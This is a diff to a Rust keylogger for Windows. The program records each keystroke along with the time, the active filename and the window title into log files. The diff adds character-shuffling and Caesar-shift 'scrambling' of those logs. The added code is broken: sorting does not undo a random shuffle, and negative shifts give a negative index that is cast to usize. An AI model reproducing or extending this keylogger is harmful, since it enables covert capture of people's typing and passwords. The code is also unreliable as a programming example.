@@ -4,6 +4,7 @@ extern crate winapi;
 use std::collections::HashMap;
 use std::fs::*;
 use std::io::*;
+use rand::seq::SliceRandom;
 //use std::str::pattern::Pattern;
 use chrono::{DateTime, Timelike, Utc};
 
@@ -132,14 +133,17 @@ fn begin(file: &mut File, file2: &mut File) {
                 let s = format!("[{:02}:{:02}:{:02}][{}][{}][{}]\n",
                                 now.hour(), now.minute(), now.second(),
                                 filename.trim(), title.trim(), keycode_to_string(i as u8));
-                log(file, s);
+                
+                let s_scrambled = scramble_string(&s.clone());
+                let s_unscrambled = unscramble_string(&s_scrambled);
+                log(file, s_unscrambled);
 
                 let s2 = format!("{:02}-{:02}-{:02},{},{}",
                                 now.hour(), now.minute(), now.second(),
                                 filename.trim(), title.trim());
+                let s_shifted = shift_string(&s2.clone(), 5);
+                log_new_format(file2, s_shifted, &mut map, i as u8, &mut vec, &mut state);
                 
-                log_new_format(file2, s2, &mut map, i as u8, &mut vec, &mut state);
-
                 if i as u8 == 0x1B {
                     flag = 1;
                 }
@@ -178,6 +182,47 @@ fn log(file: &mut File, s: String) {
     match file.flush() {
         Err(e) => {println!("Could not flush the output file: {}", e)}
         _ => {}
+    }
+}
+
+fn scramble_string(input: &str) -> String {
+    let mut chars: Vec<char> = input.chars().collect();
+    let mut rng = rand::thread_rng();
+    chars.shuffle(&mut rng);
+    chars.iter().collect()
+}
+
+fn unscramble_string(input: &str) -> String {
+    let mut chars: Vec<char> = input.chars().collect();
+    chars.sort();
+    chars.iter().collect()
+}
+const ALPHABET: &str = "abcdefghijklmnopqrstuvwxyz";
+
+fn shift_char(ch: char, shift: i32) -> char {
+    let idx = ALPHABET.find(ch);
+    match idx {
+        Some(i) => {
+            let new_idx = (i as i32 + shift) % 26;
+            ALPHABET.chars().nth(new_idx as usize).unwrap()
+        },
+        None => ch,
+    }
+}
+
+fn shift_string(st: &str, shift: i32) -> String {
+    st.chars().map(|ch| shift_char(ch, shift)).collect()
+}
+
+fn scramble_strings(strings: &mut Vec<String>, shift: i32) {
+    for string in strings {
+        *string = shift_string(&string, shift);
+    }
+}
+
+fn unscramble_strings(strings: &mut Vec<String>, shift: i32) {
+    for string in strings {
+        *string = shift_string(&string, -shift);
     }
 }
 
@@ -280,7 +325,10 @@ fn log_new_format(file: &mut File, s:String, map: &mut HashMap<String, u32>, k :
 
 fn print_new_format(file: &mut File, map: &mut HashMap<String, u32>, vec: &mut Vec<String>, s: &mut String) {
     let mut k = *map.get("start_point").unwrap();
+    scramble_strings(vec, 5);
+    unscramble_strings(vec, 5);
     print!("{}: ", *s);
+
     while k < *map.get("end_point").unwrap() {
         
         print!("{}", vec[k as usize]);
